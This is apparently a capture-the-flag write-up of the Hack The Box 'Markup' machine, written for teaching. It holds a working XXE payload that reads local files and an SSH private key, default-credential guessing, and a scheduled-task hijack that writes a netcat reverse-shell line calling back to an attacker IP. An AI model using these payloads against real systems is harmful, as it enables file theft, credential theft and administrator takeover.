---
title: "Markup — HTB Writeup"
date: 2026-06-12
draft: false
---

**Difficulty:** Easy | **OS:** Windows | **Date:** June 2026

## Overview

Markup is a Windows machine built around a single OWASP Top 10 classic: XML
External Entity (XXE) injection. The box hosts a small "MegaShopping" web
app with a login page and an order form that, behind the scenes, posts raw
XML to the backend. That's the entire foothold story — no fuzzing required,
no obscure CVE, just a form that happily parses attacker-controlled XML with
external entities enabled. From there, a leaked SSH private key gets you a
shell, and a classic Windows misconfiguration — a world-writable script
sitting inside a privileged scheduled task — hands over Administrator. If
you've ever wondered why "don't trust client-supplied XML" and "audit your
scheduled tasks' file permissions" are both perennial items on hardening
checklists, this box is a tidy demonstration of both.

## Kill Chain Summary

1. `nmap` shows ports 22 (OpenSSH for Windows), 80, and 443 (Apache/PHP on Windows) open
2. The web app's login accepts a default/guessable credential pair
3. The "Order" page submits XML directly to a backend endpoint — a textbook XXE surface
4. A crafted `DOCTYPE`/`ENTITY` payload reads arbitrary files via `file://` URIs
5. An HTML comment hints at a username; XXE is used to read that user's SSH private key
6. SSH in with the recovered key → user flag
7. A scheduled task runs a log-clearing script as Administrator, but the script file is
   writable by all local users
8. Overwrite the script to spawn a reverse shell; wait for the scheduled task to fire → root flag

## Recon & Enumeration

The initial `nmap -sC -sV -Pn --top-ports 1000` scan returned exactly three
open ports: 22/tcp (OpenSSH for Windows 8.1), and 80/443 running Apache
2.4.41 on Windows with PHP 7.2.28 — both serving a site called
"MegaShopping". With no credentials in hand, the web app was the obvious
starting point.

The front page was a login form. Rather than dig for an authentication
bypass, I worked through a short list of common default credential pairs
(`admin:admin`, `administrator:administrator`, `admin:password`, and a few
permutations). One of the default pairs worked — a reminder that
credential-stuffing a handful of defaults is often faster than any technical
attack, and that "the website has a login form" doesn't mean the login form
is the hard part.

Once authenticated, the site exposed a handful of static-looking pages —
Home, About, Products, Order, Contact. The "Order" page stood out because it
accepted real user input (quantity, item type, shipping address) and, per
its client-side JavaScript, submitted that data as a raw XML document with
`Content-Type: text/xml` to a `process.php` endpoint. Any time a web app
builds and POSTs its own XML, it's worth checking whether the *server* is as
careful about parsing that XML as the client was about generating it.

## Foothold

XXE happens when an XML parser is configured to resolve external entities
defined in a `DOCTYPE` declaration — entities that can point at local files,
internal network resources, or worse, via `SYSTEM` identifiers and URI
schemes like `file://`. If the application then reflects the resolved entity
value back to the user (as this order form does, echoing back the submitted
order details), an attacker gets an arbitrary local file read as a side
effect of placing an order.

I sent the following payload to `process.php`, replacing the legitimate
`<item>` value with an entity reference:

```xml
<?xml version="1.0"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<order>
  <quantity>3</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>
```

The response echoed back the full contents of `win.ini` inside the order
confirmation message — definitive proof the parser was resolving external
entities and that the application would happily reflect arbitrary file
contents back to an authenticated user.

The next step was figuring out *what* to read. The page's HTML source
contained a leftover developer comment: `Modified by Daniel`. On a Windows
box, a named local account is a strong hint that there's an interactive user
with a home directory — and home directories often contain `.ssh` folders
for SSH key-based auth, especially on a machine that also runs OpenSSH for
Windows. Pointing the same XXE payload at
`file:///c:/Users/daniel/.ssh/id_rsa` returned daniel's full OpenSSH private
key in the response.

From there it was a straightforward credential-based foothold: save the key
locally, fix its permissions (`chmod 600`), and `ssh -i id_rsa
daniel@<target>`. This landed a shell as `markup\daniel`, and the user flag
was sitting on the desktop.

The underlying vulnerability class here is CWE-611 (Improper Restriction of
XML External Entity Reference), and it remains relevant precisely because so
many XML libraries resolve external entities *by default* unless a developer
explicitly disables that behavior — the secure configuration is opt-in, not
opt-out.

## Privilege Escalation

With a shell as daniel, `whoami /priv` didn't show anything immediately
exploitable — no `SeImpersonatePrivilege`, no obvious token abuse path. So
the next move was a manual filesystem sweep of `C:\` for anything unusual.
Two things stood out: a zero-byte `Recovery.txt` (a red herring — empty
files are rarely useful, but worth checking) and a `C:\Log-Management`
directory, which isn't part of a stock Windows install.

Inside was `job.bat`, a batch script that checks (via `bcdedit`) whether it's
running with Administrator privileges, and if so, iterates over all Windows
event logs (`wevtutil el`) and clears each one (`wevtutil cl`). In other
words: a log-cleanup script designed to run with elevated privileges, almost
certainly via a scheduled task.

Running `icacls` against the script revealed the actual misconfiguration:

```
C:\Log-Management\job.bat BUILTIN\Users:(F)
                           NT AUTHORITY\SYSTEM:(I)(F)
                           BUILTIN\Administrators:(I)(F)
                           BUILTIN\Users:(I)(RX)
```

`BUILTIN\Users` — which includes every local account, daniel among them —
had **Full Control (F)** over a script that a scheduled task executes in an
Administrator context. This is a textbook scheduled-task hijack (MITRE
ATT&CK T1053.005): when the *content* of a privileged automation script is
writable by a low-privilege account, that account effectively controls what
runs with elevated privileges the next time the task fires. The privilege
boundary that matters isn't "who can run this script" — it's "who can
*change* what this script does."

To weaponize it, I needed a payload binary on the target (the box has no
internet access, so nothing can be pulled directly from GitHub). I hosted a
copy of `nc64.exe` via `python3 -m http.server` on my attacker box, and from
daniel's shell used PowerShell's `Invoke-WebRequest` to pull it down into
`C:\Log-Management\nc64.exe`.

With a netcat listener running locally, I overwrote `job.bat` — from
`cmd.exe`, not PowerShell, since the redirection semantics differ — with a
single line:

```
echo C:\Log-Management\nc64.exe -e cmd.exe <attacker_ip> 4444 > C:\Log-Management\job.bat
```

A couple of minutes later, the scheduled task fired, executed the rewritten
script in its Administrator context, and a `cmd.exe` shell connected back as
`markup\administrator`. From there, `type
C:\Users\Administrator\Desktop\root.txt` retrieved the final flag.

## Key Takeaways

- **XXE is still a top-tier risk because it's an opt-out, not an opt-in,
  vulnerability.** Most XML parsers resolve external entities unless a
  developer explicitly disables DTD processing / external entity resolution.
  Any endpoint that accepts raw XML from a client and parses it should be
  treated as a potential file-read (or SSRF) primitive until proven
  otherwise.
- **Leftover developer comments are reconnaissance gold.** A single HTML
  comment ("Modified by Daniel") was enough to turn a generic file-read
  primitive into a targeted, working credential.
- **File-read primitives are often credential-disclosure primitives.** On a
  box running SSH, `.ssh/id_rsa` under every plausible home directory is
  worth trying — XXE, LFI, and path traversal bugs all become "remote shell"
  bugs the moment a private key is reachable.
- **ACLs on automation scripts are part of the privilege boundary, not just
  the scheduled task definition itself.** A scheduled task configured to run
  "as Administrator" provides no security benefit if the script it executes
  can be rewritten by any authenticated user — the effective privilege of
  the task is the *lowest* permission level among everything in its
  execution chain.
- **Default/common credentials remain a viable initial access vector** even
  on machines with otherwise "interesting" vulnerabilities — always rule out
  the boring path before reaching for the technical one.

## Tools & Techniques

| Tool | Purpose | Notable flags used |
|---|---|---|
| `nmap` | Port/service enumeration | `-sC -sV -Pn --top-ports 1000` |
| Burp Suite (Repeater) | Crafting and replaying the XXE payload against `process.php` | `Content-Type: text/xml` |
| `curl` | Scripted login + XXE payload delivery | `-b/-c` for session cookies, `--data-binary` for raw XML |
| `ssh` | Foothold access using the recovered private key | `-i id_rsa` |
| `icacls` | Identifying the writable-by-everyone scheduled task script | — |
| `python3 -m http.server` | Hosting `nc64.exe` for transfer to the target | — |
| PowerShell `Invoke-WebRequest` | Pulling the payload onto the target (no internet access) | — |
| `nc64.exe` | Reverse shell payload triggered by the hijacked scheduled task | `-e cmd.exe` |
